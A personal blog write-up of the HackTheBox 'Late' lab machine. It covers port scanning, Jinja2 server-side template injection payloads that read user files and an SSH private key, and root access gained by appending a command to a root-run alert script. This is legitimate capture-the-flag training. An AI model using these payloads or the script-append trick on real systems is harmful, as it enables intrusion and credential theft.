---
created: 2022-06-13
title: "Late | HackTheBox"
description: "My Writeup for Late box from HackTheBox"
layout: post
tags: [HackTheBox]
category: [Cybersecurity]
image:
    path: /assets/img/security/late.png
---

<br>
<div align="center">

بسم الله الرحمن الرحيم <br> احييكم بتحية الإسلام السلام عليكم ورحمة الله تعالى وبركاته

</div>
<br>

Hi folks, hossam hamdy aka Ghazy is here :)
in this write-up, I'll explain how I pwn the late machine on HTB. So let's start :)

you can go to the conclusion section to get hints if you wanna solve this machine -which is retired now- by yourself.

you can go to the conclusion section to get hints if you wanna solve this machine -which is retired now- by yourself.

# [+] Enumeration

## Nmap scan

Let's start as usual with a Nmap scan for all open TCP ports using `-sC` for default scripts `-sV` for version detection, and `-oN` for normal output.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sC -sV 10.10.11.156 -oN late-nmap-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 10:43 EDT
Nmap scan report for 10.10.11.156
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.00 seconds
```

We get only two open ports `22, 80`. let's see what is running on the HTTP server.

![](https://user-images.githubusercontent.com/60070427/173336509-6f40b84e-5749-457a-8e02-be3d46ad59e5.png)

![](https://user-images.githubusercontent.com/60070427/173336544-e487c1ab-9676-494c-bfc1-0a3124c31280.png)

If we need to visit the link in the second photo we must add the newly founded host to our host's file using the following command:

```bash
┌──(kali㉿kali)-[~]
└─$  sudo echo 10.10.11.156 images.late.htb >> /etc/hosts
```

By visiting the given URL `http://images.late.htb/` we found that there is an OCR web application using the Flask framework.

![](https://user-images.githubusercontent.com/60070427/173337586-efc96d22-0083-4ff8-9645-4e6b33a5ec6e.png)

It's a simple web app that takes an image from the user and scans this image then tries to detect the letters on it then returns the `result.txt` file to the user containing the image content.

How does it really work? I don't know xD, But by searching, I found that article from G2G [Python | Convert image to text and then to speech](https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/)

Note that in the code below, we have `pytesseract.pytesseract.tesseract_cmd` attribute which is an instance of cmd/terminal. it was attractive to me that we can get a shell from it -in the real application-.

```python
# Code from G2G https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/
img = Image.open('text1.png')

# describes image format in the output
print(img)

# path where the tesseract module is installed
pytesseract.pytesseract.tesseract_cmd ='C:/Program Files (x86)/Tesseract-OCR/tesseract.exe'

# converts the image to result and saves it into result variable
result = pytesseract.image_to_string(img)
# write text in a text file and save it to source path
with open('abc.txt',mode ='w') as file:
    file.write(result)
    print(result)
p = Translator()
```

So let's try it now with this simple photo and I get the correct content after uploading this simple screenshot

![](https://user-images.githubusercontent.com/60070427/173338663-4adaa128-33b5-40b9-8188-aa0d59bf63e9.png)

and I got this output:

```bash
<p>bash: cannot set terminal process group (37387): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight ## pwd
/home/dwight
[root@paper dwight ## id
uid=@(root) gid=0(root) groups=0(root)
[root@paper dwight #
</p>
```

# [+] Foothold /Gaining access

So any uploaded photo will be parsed to text form. at this moment I thought I could use the "whoami" command cause we have the tesseract_cmd function in the sample code but it doesn't work as I think.

I try to search about the common vulnerabilities for Flask and I remember a web challenge on HTB called [Templated](https://app.hackthebox.com/challenges/templated) that talked about SSTI vulnerability. you can get more information about this vulnerability [here](https://www.wallarm.com/what/server-side-template-injection-ssti-vulnerability)

I try to test this vulnerability in our application and it was work with me with this simple payload {{7 * 7}}.

![](https://user-images.githubusercontent.com/60070427/173340228-c907fe7f-9791-4423-9b54-0e4924a8b1e1.png)

Now we know that we have the SSTI vulnerability in our machine, if you wanna craft your payload you must understand the Method resolution order function. you can use one of these payloads from this [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2).

I'll use the following payload to get the user id and name:

```python
{{ get_flashed_messages.globals.builtins.open("id").read() }}
```

after trying the payload above we the `svc_acc` username, then I use the same payload to get the user.txt flag :).

```python
{{ get_flashed_messages.globals.builtins.open("/home/svc_acc/user.txt").read() }}
```

![](https://user-images.githubusercontent.com/60070427/173340718-90465c77-b683-490f-bc52-0efca6f1d424.png)

**[+] Notes:**
_The previous steps are not as easy as it appears in the article. I used Kate text editor, after vscode and mousepad. vscode colors and fonts will cause some problems in recognizing the command in the image. many of the comments in machine forums were stuck in the font size and style. but my friend told me to use kate and it was very good._

After spending a lot of time trying to craft a payload to get an RCE from this vulnerability-a lot of copy, paste, delete, coding, and a lot of debugging :)-. we have ssh service on port `22` so we can read ssh files such as `/home/svc_acc/.ssh/id_rsa` -I got this hint from another [writeup](https://davidguest.uk/hack-the-box-late/) - which was readable and we get the Private key from it by using the following payload:

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
```

![](https://user-images.githubusercontent.com/60070427/173341895-8e6467df-d9e1-48fb-bf23-622d5e0f0549.png)

we got the private key, we will save the private key in a file with any name and use it to connect. now let's try to connect with the private key 'ssh_auth.txt'

```bash
┌──(kali㉿kali)-[~]
└─$ ssh svc_acc@10.10.11.156 -i my_key.txt
```

and we are in now :).

![](https://user-images.githubusercontent.com/60070427/173342968-685a5ab2-bfcf-4336-a1ed-d9a025d3c2c2.png)

# [+] Privilege Escalation

As the first thing I do is try `sudo -l` to list all available sudo permissions but it was in vain on this machine. so I try LinPEAS.sh and pspy to get all available information about the running process and its permissions without root permissions to view them. and I found that there is a bash script that runs with root permissions called `ssh-alert.sh` and we can read this file contains the following:

```bash
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

this file is a readable and semi-modifiable file cause we can append data to it -but can't open and write inside it directly- we can know this attribute value by using this command.

```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

the `a` is abbrev for append attribute. this script is invoked each time we have an ssh login :). so we can append the `cat /root/root.txt >> /home/svc_acc/root-flag.txt` to get the root flag in a file called `root-flag.txt` in the user directory when we go and log in again.

To do this step we use two stages, we need to add `cat /root/root.txt >> /home/svc_acc/root-flag.txt` to a file called anything.txt and we need to append this file content to the `ssh-alert.sh`

```bash
svc_acc@late:~$ nano anything.txt # add the command here and save.
svc_acc@late:~$ cat anything.txt >> /usr/local/sbin/ssh-alert.sh
```

now all we need is to exit and log in again, and we will get the root-flag.txt file containing the root flag.

This was the easiest way to solve this machine someone could have a reverse shell or any other technique but I lost a lot of time in crafting an RCE payload :(. so, I played it easy.

# [+] Conclusion

**Notes**

- Use Kate text editor
- Play it easy

**Steps**

we start with Nmap to get the running services with its version, and then visit the web application and try to access the OCR on another domain then we try to craft an SSTI payload to get any RCE or any technique that gave us the ability to connect the machine such as ssh authentication keys. and we get the user flag here. then we searched for any files that are running with root permissions and we found a file that was running each ssh login process, fortunately, it was modifiable to us and we get the root flag.

# [+] What I'm thinking about this box?

it was an easy machine in the enum and foothold stage as a technique but the worst thing I hate in this machine is the OCR I try a lot of payloads and it was in vain cause I used vscode where my friends use the same and run successfully :). so it was easy and the Privilege Escalation was the easiest part I think. finally, it's an easy Linux machine.

in this machine, I learned new things surly

- First time using ssh with the private key
- It's fine to ask for help and read some tips or writeup.
- `lsattr` switch
- try a lot of techniques to craft my own SSTI RCE payload but it was in vain :).

The more we try the more we gain experience and knowledge.

Thank you for reading, I hope this was helpful to you ❤
